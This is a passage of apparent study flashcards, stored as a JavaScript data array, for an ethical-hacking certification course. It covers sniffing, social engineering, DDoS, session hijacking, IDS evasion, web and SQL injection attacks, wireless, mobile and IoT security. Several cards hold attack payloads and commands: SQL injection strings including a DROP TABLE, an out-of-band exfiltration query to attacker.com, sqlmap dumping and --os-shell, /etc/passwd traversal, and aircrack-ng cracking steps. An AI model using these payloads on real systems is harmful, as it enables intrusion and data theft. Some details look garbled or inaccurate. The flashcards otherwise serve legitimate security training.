                    title: "Network Sniffing & Switched Networks",
                    cards: [
                        { q: "Network sniffing (how it works)?", a: "Capture + analyze network traffic; legitimate troubleshooting or credential theft\nEasy on hubs, harder on switches\nCaptures passwords, emails, files, session tokens" },
                        { q: "ARP poisoning / spoofing—how it works?", a: "Fake ARP messages link attacker's MAC to a legit device's IP\nEnables MITM—victim traffic flows through attacker\nIntercepted, modified, dropped\nPrimary switched-network sniffing method" },
                        { q: "Sniffing + MitM tools?", a: "Wireshark: packet analyzer (GUI)\nTcpdump: command-line capture (Linux/macOS)\nCain & Abel: cracker + sniffer (Windows)\nBettercap: attack + monitoring\nResponder: LLMNR/NBT-NS/mDNS poisoner, credential harvester\nEthereal (old Wireshark name), X-Wireshark" },
                        { q: "Traffic analysis?", a: "Analyze patterns WITHOUT reading content; reveals frequency, volume, parties\nWorks even when encrypted\nWireshark statistics, Maltego, NetworkMiner" },
                        { q: "Sniffing on switched networks?", a: "Switches forward only to destination MAC (unlike hubs)\nEnable: ARP Poisoning (primary), MAC Flooding (overflow CAM table→hub-like), DHCP Starvation (rogue DHCP), Port Mirroring" },
                        { q: "MAC Flooding attack?", a: "Flood CAM table with fake MACs\nOverflow→'fail-open', switch acts like a hub\nBroadcasts all traffic; enables sniffing" },
                        { q: "Sniffing encrypted traffic?", a: "Packets show ciphertext only\nObtain private key (server compromise), SSL Strip (HTTPS→HTTP downgrade—MitM tool), weak TLS exploits, cert pinning bypass, MitM w/ self-signed cert" }
                    ]
                },
                {
                    title: "Sniffing Basics",
                    cards: [
                        { q: "Network sniffing?", a: "Capture + analyze network traffic; legitimate troubleshooting or malicious (credential theft)" },
                        { q: "ARP poisoning?", a: "Fake ARP links attacker's MAC to a device's IP→intercept its traffic (MITM)" },
                        { q: "Common sniffing tools?", a: "Wireshark, Tcpdump (command-line), Network Monitor, Cain & Abel (cracker/sniffer), Bettercap" }
                    ]
                }
            ]
        },
        {
            id: 9,
            title: "Social Engineering",
            sections: [
                {
                    title: "Psychological Principles & Advanced Techniques",
                    cards: [
                        { q: "Psychological principles Social Engineering exploits?", a: "Authority: obey IT admin/police\nScarcity: limited availability→urgency\nUrgency: time pressure stops rational thought\nFamiliarity/Liking: help those you like/know\nConsistency: follow through on commitments\nReciprocity: return favors" },
                        { q: "PREP Framework in Social Engineering?", a: "Positioning: credibility + role\nRapport: trust + connection\nExtraction: gradual info gathering\nPrestige: target feels honored (ego)" },
                        { q: "Advanced phishing techniques?", a: "Spear Phishing: specific individual, personal info\nWhaling: C-level execs\nBizEmail/CEO Fraud: impersonate exec for wire transfers\nPharming: DNS poisoning to fake sites\nWaterholing: compromise sites the group visits\nFishin (Whaling variant): large-scale org targeting\nClone Phishing: legit email resent with malicious link" },
                        { q: "Domain spoofing?", a: "Lookalike domains: microsoft.com→microsof.com (missing letter), company.com→companny.com (double letter), company.com.co (extra TLD)\nPhishing emails, fake logins" },
                        { q: "QR code phishing (Quishing)?", a: "QR codes as phishing vector; URL hidden until scan\nBypasses email filters that can't scan QR\nParking tickets, event tickets, WiFi access" }
                    ]
                },
                {
                    title: "Physical SE & Prevention",
                    cards: [
                        { q: "Physical Social Engineering attacks?", a: "Tailgating/Piggybacking: follow authorized person in\nShoulder Surfing: watch password entry\nEavesdropping: listen\nDumpster Diving: trash for sensitive docs\nBaiting: infected USB in parking lots\nImpersonation: uniform, fake badge" },
                        { q: "Social Engineering prevention measures?", a: "Employee training + awareness (MOST IMPORTANT)\nVerify sensitive requests\nMFA (cuts credential-theft impact)\nSecurity policies + procedures\nPhishing simulations\nPhysical security (badges, mantraps)\nEmail filtering + DMARC/DKIM/SPF\nReport suspicious activity without punishment" },
                        { q: "OSINT in Social Engineering?", a: "Public-source info: social media (LinkedIn, Facebook, Twitter), company sites, press releases, public records\nPersonalizes attacks, builds credibility\nTheHarvester, Maltego, SpiderFoot, Recon-ng" }
                    ]
                },
                {
                    title: "Social Engineering Overview",
                    cards: [
                        { q: "Social Engineering?", a: "Psychological manipulation to make people act or disclose confidential info\nExploits authority, scarcity, urgency, familiarity, consensus" },
                        { q: "Common Social Engineering techniques?", a: "Phishing, Spear Phishing, Whaling (executives), Pretexting (fake scenarios), Baiting (enticing offers), Tailgating (physical), Quid Pro Quo (service for info)" },
                        { q: "Phishing?", a: "Fraudulent sensitive-info request disguised as trustworthy entity\nEmail phishing, smishing (SMS), vishing (voice), credential harvesting via fake sites" },
                        { q: "Spear phishing?", a: "Phishing at a specific individual/org; personalized with recon info→more convincing" },
                        { q: "Pretexting?", a: "Fabricated scenario to engage + extract; impersonates IT support or law enforcement" },
                        { q: "Tailgating?", a: "Follow authorized person into restricted area; often carrying items to seem entitled" },
                        { q: "Waterholing?", a: "Compromise sites the target group visits regularly; malware delivered on visit" },
                        { q: "Top 6 steps against Social Engineering?", a: "1) Training + awareness\n2) Verification procedures\n3) MFA\n4) Security policies\n5) Phishing simulations\n6) Physical security" }
                    ]
                }
            ]
        },
        {
            id: 10,
            title: "Denial-of-Service",
            sections: [
                {
                    title: "DoS/DDoS Attack Types & Defense",
                    cards: [
                        { q: "Three categories of DDoS attacks?", a: "Volumetric (Bandwidth): traffic floods—UDP, ICMP, Amplification (DNS, NTP, Memcached); bits per second (bps)\nProtocol (State Exhaustion): server resources—SYN floods, Ping of Death, Smurf, Fraggle; packets per second (pps)\nApplication Layer (L7): app resources—HTTP flood, Slowloris, RST flood, Zero-Day DDoS; requests per second (rps)" },
                        { q: "How does a SYN Flood work?", a: "Exploit TCP 3-way handshake: many SYNs, no SYN-ACK completion\nHalf-open connections fill table; legitimate users blocked\nSYN cookies, rate limiting mitigate" },
                        { q: "Smurf attack—how it works?", a: "ICMP echoes to broadcast addresses with spoofed victim source IP\nAll hosts reply to victim\nAmplification = number of broadcast hosts\nDirected broadcast now blocked→risk lower" },
                        { q: "Ping of Death?", a: "Malformed/oversized ICMP packets (over 65,535 bytes) crash target reassembly\nPatched in modern systems; still a legacy/IoT risk" },
                        { q: "Slowloris attack?", a: "Layer 7: many connections kept open with partial HTTP requests sent slowly\nConnection slots fill→new connections denied\nTiny bandwidth, hard to detect" },
                        { q: "DNS Amplification?", a: "DNS queries w/ spoofed victim source IP to open resolvers; response much larger than query; 28x+ amplification\nMitigate: BCP38/BCP84, close open resolvers" },
                        { q: "DoS/DDoS attack tools (offensive)?", a: "LOIC (Low Orbit Ion Cannon): basic flood\nHOIC (High Orbit Ion Cannon): LOIC + presets\nSlowloris tool\nMFlood: memory-efficient\nGoldenEye: lightweight\nBotnet-based (Mirai)\nStresser/Booter services" },
                        { q: "DDoS mitigation strategies?", a: "Rate limiting + throttling\nACL traffic filtering\nBlackhole routing (RFC 3896)\nCDNs (Cloudflare, Akamai)\nAnycast distribution\nIPS\nRedundant multi-datacenter infra\nAWS Shield, Cloudflare, Akamai Prolexic\nISP scrubbing centers" },
                        { q: "DoS vs DDoS?", a: "DoS: single source\nDDoS: many compromised systems (botnet)\nDDoS harder to block; single-source DoS often stopped by blocking one IP" },
                        { q: "Stresser/Booter service?", a: "Commercial DDoS rentals marketed as 'network testing'\nMany shut down (GameOver, AfterLife)\nOperate from weak cyber-law jurisdictions" }
                    ]
                },
                {
                    title: "DoS/DDoS Overview",
                    cards: [
                        { q: "DoS attack?", a: "Make machine/network unavailable by overwhelming bandwidth, CPU, memory" },
                        { q: "DDoS attack?", a: "Distributed DoS via botnet flooding target; many simultaneous sources" },
                        { q: "Common DDoS attack types?", a: "1) Volumetric (UDP floods, ICMP floods, amplification)\n2) Protocol (SYN floods, Ping of Death, Smurf)\n3) Application Layer (HTTP flood, Slowloris, RST flood)" },
                        { q: "SYN flood attack?", a: "Many SYNs, no handshake completion; connection table fills→blocks legit connections" },
                        { q: "Smurf attack?", a: "ICMP pings to broadcast with spoofed victim source IP; all hosts reply→victim overwhelmed" },
                        { q: "Common DoS/DDoS tools (incl. defensive)?", a: "Offensive: LOIC, HOIC, Slowloris, MFlood, botnet-based\nDefensive: Cisco F5 Big-IP, Cloudflare, Akamai DDoS protection" },
                        { q: "Preventing DoS/DDoS?", a: "1) Rate limiting\n2) Traffic filtering/ACLs\n3) Blackhole routing\n4) CDN\n5) Anycast distribution\n6) IPS\n7) Redundant infrastructure" }
                    ]
                }
            ]
        },
        {
            id: 11,
            title: "Session Hijacking",
            sections: [
                {
                    title: "TCP Session Hijacking & Application Level",
                    cards: [
                        { q: "Session Hijacking?", a: "Take over a valid TCP session; auth only at start, so a stolen session ID authenticates\n1) Track connection—sniffer + Nmap for predictable sequences\n2) Desynchronize—null data/reset flag changes SEQ/ACK\n3) Inject packets—inject data or join as MITM" },
                        { q: "Passive vs active session hijacking?", a: "Passive: observe/record; capture IDs/passwords without disturbing session\nActive: take over live session by breaking it or joining (MITM); must guess sequence number before target responds" },
                        { q: "TCP Session Hijacking types?", a: "TCP/IP Hijacking: sniff→spoof packet w/ predicted seq→desync victim→impersonate victim\nIP Spoofing (Source Routing): spoof trusted IP, inject forged packets before host responds\nRST Hijacking: spoofed RST kills session\nBlind: can't see responses; predict seq numbers to inject data\nUDP: forged server reply to victim's UDP request (stateless)" },
                        { q: "Application Level Session Hijacking methods?", a: "Stealing: session IDs via XSS, cookies\nGuessing: observe session variables\nBrute force: all ID permutations\nSniffing: HTTP header cookies or body parameters" },
                        { q: "Predicting session tokens?", a: "Sequential: incrementing IDs\nTimestamp-based\nSmall token space→brute force\nWeak RNG (predictable PRNG)\nNo rate limiting allows rapid guessing" },
                        { q: "Man-in-the-Browser attack?", a: "Trojan loads after browser restart\nHandler registered for every page visit\nExtension matches URL vs targeted sites\nOn login extracts + modifies DOM fields\nBrowser sends modified values; server processes them" },
                        { q: "Cross-Site Request Forgery (CSRF)?", a: "Exploit trust in authenticated session\nVictim clicks link→browser auto-includes cookies/session tokens\nApp doesn't verify request origin\nAnti-CSRF tokens, SameSite cookies prevent it" }
                    ]
                },
                {
                    title: "Client-Side Session Attacks",
                    cards: [
                        { q: "Session Fixation?", a: "Attacker sets session ID ahead (link, cookie)\nVictim logs in with known ID; ID not regenerated after auth\nRegenerate session ID after login" },
                        { q: "CRIME Attack?", a: "Compression Ratio Leak Made Easy\nClient-side attack on TLS/HTTP compression ratio; infer cookies from compressed sizes\nSSL/TLS, SPDY, HTTPS\nDisable TLS compression" },
                        { q: "FREAK / Forbidden Attack?", a: "FREAK (Factoring RSA Export Keys): downgrade to weak export crypto\nForbidden: MITM exploiting nonce reuse in TLS handshake + AES-GCM cipher exploitation\nStrong ciphers, TLS hardening" },
                        { q: "Session Donation Attack?", a: "Attacker logs into shared session→victim clicks link→victim authenticates attacker's session→attacker gets victim data\nBind session to user/IP/device" }
                    ]
                },
                {
                    title: "Session Hijacking Overview",
                    cards: [
                        { q: "Types of session hijacking?", a: "1) Network hijacking (traffic interception)\n2) Web session (cookie theft)\n3) MITM attacks\n4) XSS for cookie theft" },
                        { q: "Preventing session hijacking?", a: "1) HTTPS + secure cookies\n2) Session ID rotation after login\n3) Cookie flags (HttpOnly, Secure, SameSite)\n4) TLS\n5) CSRF tokens\n6) Monitor anomalous sessions" }
                    ]
                }
            ]
        },
        {
            id: 12,
            title: "Evading IDS, Firewalls & Honeypots",
            sections: [
                {
                    title: "IDS Evasion & Firewall Bypass",
                    cards: [
                        { q: "IDS evasion techniques?", a: "Fragmentation: split packets to evade signatures\nJunk Data Injection: random data before payload\nTiming: slow scans under thresholds\nDecoys: multiple IPs at once (Nmap -D)\nOS Fingerprint Evasion\nPacket Reordering" },
                        { q: "Fragmentation for IDS evasion?", a: "Split payload into small fragments—harmless alone; IDS may not reassemble before inspecting\nTarget reassembles + executes\nNmap -f (minimum fragmentation)" },
                        { q: "IDS evasion tools?", a: "Nmap: -f (fragment), -D (decoys), -S (spoofed IP), -g (source port)\nScapy: custom packets\nSwiftenet: IDS/IPS evasion framework\nP0f: OS fingerprinting w/ evasion\nFragment Scanner" },
                        { q: "Decoy scanning?", a: "Nmap -D sends from multiple fake source IPs\nnmap -D decoy1,decoy2,yourIP target\nIDS sees all decoys→hard to spot real scanner\nRandom or specified decoys" },
                        { q: "Firewall evasion techniques?", a: "IP Fragmentation: bypass inspection\nTunneling: encapsulate in allowed protocols (HTTP tunnel)\nDNS Tunneling: exfiltrate via queries\nIPv6 tunnel through IPv4-only FW\nBlend in w/ legit ports/protocols" },
                        { q: "TCP wrapping?", a: "Malicious TCP packet inside another TCP packet; outer passes firewall, inner carries payload; bypasses stateful FWs" },
                        { q: "DNS tunneling?", a: "Encode data in DNS queries to bypass FWs\nencoded-data.evil.com\nDNS server relays exfiltrated data\niodine, dnscat2, dns2tcp" }
                    ]
                },
                {
                    title: "Honeypot Detection & IPS",
                    cards: [
                        { q: "Honeypot types?", a: "Decoy attracting attackers + studying behavior\nProduction: easy deploy, org defense\nResearch: complex, security research\nThreat Intelligence: collect attacker TTPs" },
                        { q: "Honeypot detection methods?", a: "Unusual services (honeyd = limited implementations)\nResponse signatures (simplified)\nTiming-analysis port scans\nDuplicate MACs on multiple IPs\nTCP/IP stack behavior differences" },
                        { q: "IDS vs IPS?", a: "IDS: monitors + alerts; passive, out-of-band\nIPS: actively blocks malicious traffic; inline, drops packets" },
                        { q: "IPS bypass techniques?", a: "Exploit inspection blind spots\nEncrypt payload\nSlow attacks below thresholds\nFragment across sessions\nTarget app-layer vulns signatures miss" }
                    ]
                },
                {
                    title: "IDS/IPS Overview",
                    cards: [
                        { q: "IDS (Intrusion Detection System)?", a: "Monitor network/system activity for malicious acts or policy violations\nNIDS (network), HIDS (host)\nSignature-based vs anomaly-based" },
                        { q: "IPS (Intrusion Prevention System)?", a: "Like IDS but actively blocks in real time; drops packets, resets connections, blocks IPs" },
                        { q: "Evasion techniques (summary)?", a: "1) Fragmentation\n2) Decoy scanning\n3) Timing scans in normal traffic\n4) Source IP spoofing\n5) Tunneling (DNS, ICMP)\n6) Polymorphic attacks\n7) Slow scanning under thresholds" },
                        { q: "Honeypot (definition)?", a: "Decoy system to attract + study attackers\nResearch (academic), production (org early warning)\nLow vs high interaction" }
                    ]
                }
            ]
        },
        {
            id: 13,
            title: "Hacking Web Servers",
            sections: [
                {
                    title: "Web Server Attack Vectors & Hardening",
                    cards: [
                        { q: "Web server attack vectors?", a: "Misconfigurations: default pages, directory listing, weak SSL/TLS\nOutdated software with known vulns\nWeak auth: default credentials\nServer-side extensions: ASP, PHP, JSP vulns\nCGI scripts: buffer overflows, command injection" },
                        { q: "Web server info gathering?", a: "Server type/version (curl -I, Nmap, WhatWeb)\nDefault + test pages\nDirectory listing\nVirtual hosts\nHTTP headers for tech stack\nNikto, DirBuster, Gobuster" },
                        { q: "Directory traversal attack (example + prevention)?", a: "Insufficient input validation→access files outside web root; ../ sequences navigate\nExample: GET /../../etc/passwd\nPrevent: validate + sanitize input, use chroot (OWASP Path Traversal)" },
                        { q: "Web server hardening (checklist)?", a: "Remove default/test pages\nDisable directory listing\nStrong SSL/TLS\nUpdate software\nRestrict HTTP methods (GET, POST, HEAD)\nWAF\nSecurity headers (X-Frame-Options, CSP, HSTS)\nRegular scanning" },
                        { q: "Essential web server security headers?", a: "X-Frame-Options: DENY/SAMEORIGIN—anti-clickjacking\nX-Content-Type-Options: nosniff—anti-MIME sniffing\nStrict-Transport-Security (HSTS): force HTTPS\nContent-Security-Policy (CSP): control resource loading\nX-XSS-Protection: XSS filter\nReferrer-Policy: referrer info" }
                    ]
                },
                {
                    title: "Web Server Attacks Overview",
                    cards: [
                        { q: "Common web server vulnerabilities?", a: "1) Outdated software\n2) Misconfigurations\n3) Default credentials\n4) Directory traversal\n5) Server-side includes attacks\n6) CGI vulnerabilities\n7) HTTP request smuggling" },
                        { q: "Directory traversal (definition)?", a: "'...' (../ or ..\\) sequences reach files outside intended root; can expose /etc/passwd, web.config, source code" },
                        { q: "Securing web servers (steps)?", a: "1) Update software\n2) Disable unused services/modules\n3) Strong auth\n4) WAF\n5) Regular audits\n6) File permissions\n7) Enforce HTTPS" }
                    ]
                }
            ]
        },
        {
            id: 14,
            title: "Hacking Web Applications",
            sections: [
                {
                    title: "OWASP Top 10 & XSS",
                    cards: [
                        { q: "OWASP + OWASP Top 10 (current list)?", a: "Open Web Application Security Project; industry-standard awareness document\nTop 10: 1) Broken Access Control 2) Cryptographic Failures 3) Injection 4) Insecure Design 5) Security Misconfiguration 6) Vulnerable Components 7) Authentication Failures 8) Software & Data Integrity 9) Security Logging Failures 10) Server-Side Request Forgery" },
                        { q: "Injection vulnerability?", a: "Send untrusted data to an interpreter\nSQLi: SQL commands via web input\nCommand injection: OS commands\nLDAP, XML, XPath\nParameterized queries, input validation, output encoding prevent it" },
                        { q: "Broken Access Control?", a: "Users access resources/functions they shouldn't\nDirect object reference (others' data), privilege escalation, vertical/horizontal bypass\nEnforce access control server-side; security frameworks" },
                        { q: "XSS attack types?", a: "Reflected: malicious script via URL in response\nStored: script on server (database), served to all users\nDOM-based: client-side JS modifies DOM\nDifferent impact + prevention per type" },
                        { q: "Preventing XSS?", a: "Input validation\nOutput encoding (special chars: quotes, angle brackets, &)\nContent-Security-Policy restricts script sources\nHttpOnly cookie flag blocks document.cookie\nFrameworks that auto-escape (React, Angular)" }
                    ]
                },
                {
                    title: "CSRF, Clickjacking & Web App Tools",
                    cards: [
                        { q: "CSRF attack + prevention?", a: "Force authenticated user to perform unwanted actions via active session/cookies\nAnti-CSRF tokens per session/user\nSameSite cookies\nCustom header verification (X-Requested-With)\nRe-auth for sensitive actions" },
                        { q: "Clickjacking?", a: "Trick user into clicking hidden/misleading elements\nInvisible iframe overlays legit content; click triggers hidden action\nX-Frame-Options DENY or SAMEORIGIN\nCSP frame-ancestors directive" },
                        { q: "Web app security testing tools?", a: "OWASP ZAP: open-source web scanner\nBurp Suite: manual web security toolkit\nAcunetix: automated web scanner\nNikto: web server scanner\nSQLmap: SQL injection tool\nWfuzz: web fuzzer\nSkipfish: web app scanner\nArachni: multi-framework web scanner" }
                    ]
                },
                {
                    title: "Web App Security Overview",
                    cards: [
                        { q: "OWASP Top 10 (original list)?", a: "Standard awareness document—consensus on critical risks\nInjection, Broken Authentication, Sensitive Data Exposure, XXE, Broken Access Control, Security Misconfiguration, XSS, Insecure Deserialization, Vulnerable Components, Insufficient Logging" },
                        { q: "Cross-Site Scripting (XSS)?", a: "Inject malicious scripts into pages viewed by others\nStored (server-persisted), Reflected (URL params), DOM-based (client-side)\nSteals cookies, session tokens; defaces sites" },
                        { q: "Cross-Site Request Forgery (CSRF)?", a: "Force authenticated user into unintended actions; browser sends requests with their credentials\nAnti-CSRF tokens, SameSite cookies" }
                    ]
                }
            ]
        },
        {
            id: 15,
            title: "SQL Injection",
            sections: [
                {
                    title: "SQL Injection Types & Tools",
                    cards: [
                        { q: "SQL injection types (detailed)?", a: "In-band (Classic): Error-based (DB errors reveal info), Union-based (UNION SELECT combines queries)\nInferential (Blind): Boolean-based (true/false via page response), Time-based (DELAY/BENCHMARK timing diffs)\nOut-of-band: DNS/HTTP exfiltration when in-band fails" },
                        { q: "UNION-based SQL Injection?", a: "UNION combines original + attacker query; match column count (find via ORDER BY)\n' UNION SELECT username, password FROM users--\nData returns in same response" },
                        { q: "Blind SQL Injection?", a: "No direct data returned\nBoolean: response changes on true/false—' AND 1=1 vs ' AND 1=2\nTime: DB sleep functions—SQL Server WAITFOR DELAY '0:0:5', MySQL SLEEP(5), PostgreSQL pg_sleep(5)" },
                        { q: "Out-of-Band SQL Injection?", a: "Exfiltrate via different channel\nDNS: SELECT LOAD_FILE(CONCAT('\\', table_name, '.attacker.com\\'))\nHTTP to attacker server\nRare; needs specific DB config" },
                        { q: "SQL injection tools?", a: "SQLmap: most popular—sqlmap -u 'url?id=1' --dbs (list DBs), -D dbname --tables, -T tablename --dump\nHavij: GUI (Windows)\nMantra: automated\nModlishka: phishing + SQLi" },
                        { q: "SQLmap usage?", a: "Basic: sqlmap -u 'http://target/page?id=1'\n--dbs databases\n-D dbname --tables tables\n-D dbname -T tbl --dump data\n--os-shell shell\n--passwords\nWAF bypass: --batch --technique=B" }
                    ]
                },
                {
                    title: "Database Exploitation & SQLi Prevention",
                    cards: [
                        { q: "After successful SQL injection?", a: "Extract usernames, passwords, PII\nBypass auth\nModify/delete data\nOS commands via DB features—MySQL INTO OUTFILE, EXECUTE; SQL Server xp_cmdshell; PostgreSQL COPY FROM PROGRAM" },
                        { q: "SQL injection auth bypass?", a: "Classic: ' OR 1=1--\nusername field admin'--, password anything\nComments out rest→condition always true\nAlt: ' OR ''='\nLogin forms, API endpoints, search functions" },
                        { q: "SQL injection prevention (detailed)?", a: "Parameterized queries (prepared statements)\nParameterized stored procedures\nInput validation + sanitization\nLeast-privilege DB accounts\nWAF rules\nSecurity testing + code review\nORM frameworks\nNever expose DB errors to users" },
                        { q: "Common SQL injection payloads?", a: "Auth bypass: ' OR 1=1--\nUNION: ' UNION SELECT NULL,NULL,NULL--\nStacked: '; DROP TABLE users--\nComments: --, #, /*, ;*/\nEncoding: URL, Unicode, hex\nSecond-order: stored, executed later" }
                    ]
                },
                {
                    title: "SQL Injection Overview",
                    cards: [
                        { q: "SQL injection?", a: "Malicious SQL inserted into input fields to execute arbitrary commands\nBypasses auth, extracts data, modifies/deletes records, can gain server access" },
                        { q: "SQL injection types (summary)?", a: "1) In-band (Classic): UNION-based, Error-based\n2) Blind (Inferential): Boolean-based, Time-based\n3) Out-of-band: DNS/HTTP" },
                        { q: "'OR 1=1' injection?", a: "Always-true payload; username=' OR 1=1-- makes WHERE always true→bypasses login, returns all users" },
                        { q: "SQL injection prevention (top 6)?", a: "1) Parameterized queries (prepared statements)\n2) Input validation + sanitization\n3) Stored procedures\n4) Least-privilege DB accounts\n5) WAF\n6) ORM frameworks" }
                    ]
                }
            ]
        },
        {
            id: 16,
            title: "Hacking Wireless Networks",
            sections: [
                {
                    title: "Wireless Network Attacks & Defense",
                    cards: [
                        { q: "Wireless network attack types (detailed)?", a: "Rogue APs: unauthorized APs\nEvil Twin: fake AP w/ legit-looking name\nWarDriving: drive to search for networks\nWarChalking: mark found networks symbolically\nDeauthentication: force clients off\nMAC Cloning/Spoofing" },
                        { q: "Wireless encryption standards?", a: "WEP (Wired Equivalent Privacy): broken, easily cracked\nWPA: WEP improvement, has weaknesses\nWPA2: AES, most common (dictionary-attack vulnerable)\nWPA3: SAE auth, forward secrecy\nWPS: PIN vulnerability, easy crack" },
                        { q: "WPA Handshake attack?", a: "Capture 4-way handshake client + AP, then offline dictionary/brute on PSK; aircrack-ng\n1) Monitor: airmon-ng start wlan0\n2) Capture: airodump-ng --capture handshark.cap\n3) Deauth client to force reconnect\n4) Crack: aircrack-ng -w wordlist.txt handshark.cap" },
                        { q: "Evil Twin attack (mechanism + tools)?", a: "Fake AP with same SSID as legit; clients connect thinking real\nIntercept all traffic, capture credentials\nairbase-ng, hostapd, wifiphisher\n802.1X enterprise auth, rogue AP monitoring prevent it" },
                        { q: "Rogue Access Point?", a: "Unauthorized AP on secure network; installed by employees without IT knowledge\nBackdoor for attackers\nWIDS detection\nNetwork access control policies prevent it" },
                        { q: "WarDriving?", a: "Search for wireless networks while moving; laptop/phone WiFi + GPS\nNetSpot, InSSIDer, Android WiFi Analyzer\nReveals open networks, WEP/WPA, hidden SSIDs, signal strength" },
                        { q: "Wireless attack tools?", a: "Aircrack-ng: monitor mode, capture, crack WEP/WPA\nKismet: wireless detector/sniffer\nReaver: WPS attacks\nFern WiFi Cracker: GUI\nBully: WPS offline/online\nCowpatty: precomputed PMKID" },
                        { q: "PMKID Attack?", a: "WPA2-Personal target; capture PMKID from first handshake message—faster than full handshake\naircrack-ng + hashcat\nNeeds station connected or known SSID" },
                        { q: "Securing wireless networks (full checklist)?", a: "WPA3 (or WPA2-AES)\nDisable WPS\nStrong PSK (12+ chars)\nHide SSID (limited effect)\nMAC filtering (easily spoofed)\nFirmware updates\n802.1X/RADIUS enterprise auth\nGuest WiFi segmentation\nWireless site surveys" },
                        { q: "Wireless Intrusion Prevention System (WIPS)?", a: "Detect + block unauthorized wireless devices; rogue APs, evil twins, deauth/spoofing\nCisco IPS, Aruba Wireless IDS\nAuto-block malicious MACs" }
                    ]
                },
                {
                    title: "Wireless Network Attacks Overview",
                    cards: [
                        { q: "Common wireless attack types (list)?", a: "1) Eavesdropping/Sniffing\n2) Rogue APs\n3) Evil twin\n4) War driving\n5) Jamming\n6) Deauthentication\n7) WEP/WPA cracking" },
                        { q: "Evil twin attack?", a: "Fake AP mimicking legit SSID; users connect, attacker intercepts traffic + steals credentials" },
                        { q: "Securing wireless networks (top 6)?", a: "1) WPA3 (or WPA2)\n2) Disable WPS\n3) Hide SSID (obscurity—not sufficient alone)\n4) MAC filtering\n5) Firmware updates\n6) 802.1X/RADIUS enterprise auth" }
                    ]
                }
            ]
        },
        {
            id: 17,
            title: "Hacking Mobile Platforms",
            sections: [
                {
                    title: "Android & iOS Security",
                    cards: [
                        { q: "Android-specific vulnerabilities?", a: "APK reverse engineering—code extraction, API keys\nInsecure storage: SQLite DBs, shared preferences\nWeak transport-layer encryption\nWeak server-side API controls\nObfuscation bypass (ProGuard)\nMalicious third-party app stores" },
                        { q: "Android App Security Testing?", a: "Static: decompile APK (apktool, jd-gui, JADX), check AndroidManifest.xml permissions, hardcoded credentials/API keys, SSL pinning\nDynamic: emulator/sandbox run, Burp Suite/mitmproxy intercept, Frida runtime manipulation" },
                        { q: "iOS-specific vulnerabilities?", a: "Jailbreaking exposes system files\nInsecure storage: Keychain misuse, local DB exposure\nBackup encryption disabled\nSSL pinning bypass\nClassKit/Handoff vulns\niMessage exploit vectors" },
                        { q: "iOS Jailbreaking?", a: "Remove Apple restrictions\nBypass App Store controls, malware exposure, break code signing, Keychain exposure, no OTA updates\nMDM policies detect it" },
                        { q: "iOS pentesting security tools?", a: "Cydia Impactor: unsigned apps\nFrida: dynamic instrumentation\nObjection: runtime exploration\nCharles Proxy: HTTP debugging\nXcode: dev/testing\nHopper Disassembler: static analysis" }
                    ]
                },
                {
                    title: "Mobile Malware & MDM",
                    cards: [
                        { q: "Mobile malware types?", a: "Trojans: look legit, act malicious\nSpyware: track location, contacts, messages\nRansomware: lock device, demand payment\nAdware: unwanted ads\nRootkits: root/jailbreak access\nBanking Trojans: intercept banking transactions" },
                        { q: "Mobile phishing (Smishing/Vishing)?", a: "Smishing: fake SMS w/ malicious links\nMobile email phishing for small screens\nVishing: phone calls requesting sensitive info\nQuishing: malicious QR codes in messages" },
                        { q: "Mobile Device Management (MDM)?", a: "Enterprise mobile device management\nRemote wipe lost/stolen\nEnforce encryption + password policies\nApp whitelisting/blacklisting\nVPN distribution\nCertificate management\nJailbreak/root detection" },
                        { q: "Securing mobile devices (detailed)?", a: "Encryption (FDE/FBE)\nStrong auth (biometrics + PIN)\nUpdate OS + apps\nOfficial app stores only\nMDM/EMM, MAM\nRemote wipe\nDisable Bluetooth/WiFi when unused" }
                    ]
                },
                {
                    title: "Mobile Security Overview",
                    cards: [
                        { q: "Mobile security risks?", a: "1) Malicious apps (sideloading)\n2) MITM attacks\n3) Network sniffing\n4) GPS tracking\n5) Smishing\n6) Jailbreak/root exploits\n7) Insecure data storage" },
                        { q: "Jailbreaking?", a: "Remove iOS restrictions for unauthorized app installs; Android equivalent = rooting; raises security risks + voids warranty" },
                        { q: "Securing mobile devices (top 6)?", a: "1) Device encryption\n2) Strong auth (biometrics + PIN)\n3) Update OS/apps\n4) Official stores only\n5) MDM\n6) Remote wipe" }
                    ]
                }
            ]
        },
        {
            id: 18,
            title: "IoT & OT Hacking",
            sections: [
                {
                    title: "IoT Security & Exploitation",
                    cards: [
                        { q: "IoT security challenges (device-level)?", a: "Default credentials\nNo communication encryption\nInsecure firmware updates\nNo patch management\nPhysical tampering access\nLimited resources restrict controls\nProprietary protocols" },
                        { q: "IoT vs OT?", a: "IoT: consumer/enterprise connected devices (smart home, wearables)\nOT: industrial control, SCADA, PLCs\nIoT=data collection, OT=physical processes\nHigher safety implications when OT is compromised" },
                        { q: "Common IoT protocols?", a: "MQTT: lightweight pub/sub (Message Queuing Telemetry Transport)\nCoAP: HTTP-like for constrained devices\nZigbee: low-power mesh\nZ-Wave: home automation\nBLE: short-range\nLoRaWAN: long-range low-power WAN" },
                        { q: "Attacking IoT devices?", a: "Physical: open device, UART/USB serial console, extract firmware from flash, read config for credentials\nNetwork: scan ports/services, default credentials, known CVEs, intercept unencrypted comms" },
                        { q: "Mirai Botnet?", a: "IoT botnet on millions of devices (cameras, routers); scanned Telnet/SSH defaults\nMassive DDoS—Dyn DNS attack: 1Tbps+\nSource leaked 2016" },
                        { q: "IoT security testing tools?", a: "Firmware: binwalk, firmware-mod-kit, QEMU\nHardware: Bus Pirate, JTAGulator, Raspberry Pi (serial)\nNetwork: Wireshark, Nmap, Burp Suite\nWireless: HackRF, USRP SDR\nDiscovery: IoT-Scanner, Shodan" }
                    ]
                },
                {
                    title: "SCADA/ICS Security",
                    cards: [
                        { q: "SCADA/ICS vulnerabilities?", a: "Legacy systems not network-designed\nProprietary protocols w/ weak/no auth\n10-20 year lifecycles without security updates\nPhysical safety implications\nStuxnet proved real-world damage" },
                        { q: "Common ICS/SCADA protocols?", a: "Modbus: industrial, no auth\nDNP3: utilities\nBACnet: building automation\nPROFINET: industrial Ethernet\nOPC UA: more secure\nS7comm: Siemens PLCs" },
                        { q: "Securing SCADA/ICS?", a: "Segmentation (Purdue Model)\nICS firewalls (Nozomi, Claroty)\nICS IDS monitoring\nDisable unused services\nPhysical controller security\nOT incident response plans\nPassive vulnerability assessments" }
                    ]
                },
                {
                    title: "IoT & OT Overview",
                    cards: [
                        { q: "IoT?", a: "Physical devices w/ sensors + connectivity to exchange data; smart home, industrial controllers, medical devices, wearables" },
